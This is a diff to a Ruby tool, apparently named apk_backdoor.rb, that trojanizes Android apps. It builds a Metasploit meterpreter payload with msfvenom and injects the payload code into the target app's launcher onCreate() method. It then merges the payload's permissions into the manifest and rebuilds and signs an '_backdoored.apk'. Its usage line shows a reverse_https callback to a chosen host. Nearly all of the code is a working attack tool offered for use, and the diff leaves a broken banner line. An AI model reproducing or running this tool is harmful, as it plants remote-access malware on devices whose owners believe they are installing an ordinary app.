@@ -13,8 +13,11 @@ puts "
  ██╔██╗ ██║     ████╔╝██║██║  ██║ ╚═══██╗██╔══██╗ ███╔╝  
 ██╔╝ ██╗╚██████╗╚██████╔╝██████╔╝██████╔╝██║  ██║███████╗
 ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝                                  
-".cyan
-puts "[*] Authored by timwr, Jack64".blue + "&".cyan + "Updated by xC0d3rZ.".blue
+".
+
+puts "[*] Created by timwr, Jack64".blue + "&".cyan + "developed by xC0d3rZ.".blue
+
+
 # Find the activity thatapk_backdoor.rb  is opened when you click the app icon
 def findlauncheractivity(amanifest)
     package = amanifest.xpath("//manifest").first['package']
@@ -40,9 +43,9 @@ end
 # If XML parsing of the manifest fails, recursively search
 # the smali code for the onCreate() hook and let the user
 # pick the injection point
-def scrapeFilesForLauncherActivity(org_dir)
+def scrapeFilesForLauncherActivity(a)
 	smali_files||=[]
-	Dir.glob(org_dir+'/smali*/**/*.smali') do |file|
+	Dir.glob(a+'/smali*/**/*.smali') do |file|
 	  checkFile=File.read(file)
 	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
 		smali_files << file
@@ -51,9 +54,9 @@ def scrapeFilesForLauncherActivity(org_dir)
 	  end
 	end
 	i=0
-	puts "[*] Please choose from one of the following:".gray
+	print "[*] Please choose from one of the following:\n"
 	smali_files.each{|s_file|
-		puts "[+] Hook point ".brown+i+":",s_file,"\n"
+		print "[+] Hook point ",i,": ",s_file,"\n"
 		i+=1
 	}
 	hook=-1
@@ -75,11 +78,11 @@ def scrapeFilesForLauncherActivity(org_dir)
 	}
 	return [smalifile,activitysmali]
 end
-def fix_manifest(d_payload , d_original)
+
+def fix_manifest(a , b)
 	payload_permissions=[]
-	
 	#Load payload's permissions
-	File.open(d_payload+"/AndroidManifest.xml","r"){|file|
+	File.open(a+"/AndroidManifest.xml","r"){|file|
 		k=File.read(file)
 		payload_manifest=Nokogiri::XML(k)
 		permissions = payload_manifest.xpath("//manifest/uses-permission")
@@ -87,13 +90,12 @@ def fix_manifest(d_payload , d_original)
 			name=permission.attribute("name")
 			payload_permissions << name.to_s
 		end
-	#	print "#{k}"
 	}
 	original_permissions=[]
 	apk_mani=''
 	
 	#Load original apk's permissions
-	File.open(d_original+"/AndroidManifest.xml","r"){|file2|
+	File.open(b+"/AndroidManifest.xml","r"){|file2|
 		k=File.read(file2)
 		apk_mani=k
 		original_manifest=Nokogiri::XML(k)
@@ -102,13 +104,12 @@ def fix_manifest(d_payload , d_original)
 			name=permission.attribute("name")
 			original_permissions << name.to_s
 		end
-	#	print "#{k}"
 	}
 	#Get permissions that are not in original APK
 	add_permissions=[]
 	for permission in payload_permissions
 		if !(original_permissions.include? permission)
-			puts "[*] Adding #{permission}".white
+			print "[*] Adding #{permission}\n"
 			add_permissions << permission
 		end
 	end
@@ -126,21 +127,23 @@ def fix_manifest(d_payload , d_original)
 			new_mani << line+"\n"
 		end
 	end
-	File.open(d_original+"/AndroidManifest.xml", "w") {|file| file.puts new_mani }
+	File.open(b+"/AndroidManifest.xml", "w") {|file| file.puts new_mani }
 end
+
 def randomString(size = 6)
   charset = %w{ 2 3 4 6 7 9 A C D E F G H J K M N P Q R T V W X Y Z}
   (0...size).map{ charset.to_a[rand(charset.size)] }.join
 end
-work_dir = Dir.pwd+"/";
-output_dir = work_dir+"tmp/"+randomString(6)
+work_dir = Dir.pwd + "/";
+output_dir = work_dir+ "tmp/" +randomString(6)
 apkfile = ARGV[0]
+d_tools = "#{work_dir}/embed_tools/"
 unless(apkfile)
     puts "[+] Usage: #{$0} {target.apk} [msfvenom options]".red + "\n"
 	puts "[+] e.g. #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".cyan
 	exit(1)
 end
-signapk = work_dir + "embed_tools/signapk/signapk.jar"
+signapk = "#{d_tools}signapk/signapk.jar"
 unless(signapk && File.readable?(signapk))
 	puts "[+] Cannot find signapk tool".red
 	exit(1)
@@ -149,12 +152,12 @@ unless (File.readable?(apkfile))
 	puts "[-] Cannot find #{apkfile}".red + "\n";
 	exit(1);
 end
-apktool = work_dir + "embed_tools/apktool.jar"
+apktool = "#{d_tools}apktool.jar"
 unless(apktool && File.readable?(apktool))
 	puts "[+] Cannot find apktool tool".red
 	exit(1)
 end
-apk_v= `$(pwd)/embed_tools/apktool.sh -version`;
+apk_v= `#{d_tools}apktool -version`;
 unless(apk_v.split()[0].include?("2."))
 	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n".red
 	exit(1)
@@ -176,37 +179,38 @@ end
 if (output_dir)
 	 `mkdir #{output_dir}`
 end
-f_payload  = "#{output_dir}/payload.apk"
-f_original = "#{output_dir}/original.apk"
-f_signapk  = "#{output_dir}/signapk.apk"
-d_payload  = "#{output_dir}/payload"
-d_original = "#{output_dir}/original"
+payloadAPK  = "#{output_dir}/payload.apk"
+originalAPK = "#{output_dir}/original.apk"
+signAPK  = "#{output_dir}/signapk.apk"
+payloadDir  = "#{output_dir}/payload"
+originalDir = "#{output_dir}/original"
 puts "[1] Generating msfvenom payload".yellow
-res=`msfvenom -f raw #{opts} -o #{f_payload} 2>&1`
+res=`msfvenom -f raw #{opts} -o #{payloadAPK} 2>&1`
 if res.downcase.include?("invalid" || "error")
 	puts res
 	exit(1)
 end
 
 puts "[2] Signing payload".yellow + "\n"
-`$(pwd)/embed_tools/signapk.sh #{f_payload} #{f_signapk}`
-`cp #{apkfile} #{f_original}`
+`#{d_tools}apksign #{payloadAPK} #{signAPK}`
+`cp #{apkfile} #{originalAPK}`
 puts "[3] Decompiling orignal APK".yellow + "\n"
-`$(pwd)/embed_tools/apktool.sh d #{f_original} -o #{d_original}`
+`#{d_tools}apktool d #{originalAPK} -o #{originalDir}`
 print "[4] Decompiling payload APK".yellow + "\n"
-`$(pwd)/embed_tools/apktool.sh d #{f_signapk} -o #{d_payload}`
-f = File.open(d_original+"/AndroidManifest.xml")
-amanifest = Nokogiri::XML(f)
+`#{d_tools}apktool d #{signAPK} -o #{payloadDir}`
+
+f = File.open("#{originalDir}/AndroidManifest.xml")
+AndroidManifest = Nokogiri::XML(f)
 f.close
 puts "[5] Locating onCreate() hook".yellow + "\n"
-launcheractivity = findlauncheractivity(amanifest)
-smalifile = d_original+'/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
+launcheractivity = findlauncheractivity(AndroidManifest)
+smalifile = originalDir+'/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
 begin
 	activitysmali = File.read(smalifile)
 rescue Errno::ENOENT
 	puts "[!] Unable to find correct hook automatically.".red + "\n"
 	begin
-		results=scrapeFilesForLauncherActivity(d_original)
+		results=scrapeFilesForLauncherActivity(originalDir)
 		smalifile=results[0]
 		activitysmali=results[1]
 	rescue
@@ -216,23 +220,25 @@ rescue Errno::ENOENT
 end
 
 puts "[6] Copying payload files".yellow + "\n"
-FileUtils.mkdir_p("#{d_original}/smali/com/metasploit/stage/")
-FileUtils.cp Dir.glob("#{d_payload}/smali/com/metasploit/stage/Payload*.smali"), "#{d_original}/smali/com/metasploit/stage/"
+FileUtils.mkdir_p("#{originalDir}/smali/com/metasploit/stage/")
+FileUtils.cp Dir.glob("#{payloadDir}/smali/com/metasploit/stage/Payload*.smali"), "#{originalDir}/smali/com/metasploit/stage/"
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
 puts "[7] Loading ".yellow + File.basename(smalifile) + " and injecting payload".yellow + "\n"
 File.open(smalifile, "w") {|file| file.puts hookedsmali }
+
 injected_apk= "#{output_dir}/"+apkfile.split(".")[0]
 injected_apk+="_backdoored.apk"
 puts "[8] Poisoning the manifest with meterpreter permissions".yellow + "\n"
-fix_manifest(d_payload,d_original)
-puts "[9] Rebuilding #{apkfile} with meterpreter injection as ".yellow + File.basename(injected_apk)+ "\n"
-`$(pwd)/embed_tools/apktool.sh b -o p #{injected_apk} #{d_original}`
+fix_manifest(payloadDir,originalDir)
+puts "[9] Rebuilding #{apkfile} with metasploit payload in ".yellow + File.basename(injected_apk)+ "\n"
+`#{d_tools}apktool b -o #{injected_apk} #{originalDir}`
 unless (File.readable?(injected_apk))
-puts "[-] Error creating injection APK,If you haven't Android-SDK please install it.".red
+puts "[-] Unable to rebuilding #{apkfile} with metasploit payload.".red
+puts "To fix it".blue;
 exit(1);
 end
 puts "[10] Signing".yellow + File.basename(injected_apk)+ "\n"
-`$(pwd)/embed_tools/signapk.sh #{injected_apk} $(pwd)/__#{apkfile}_backdoored.apk`
+`#{d_tools}apksign #{injected_apk} $(pwd)/__#{apkfile}_backdoored.apk`
 puts "[11] Infected file __#{apkfile}_backdoored.apk ready.".green
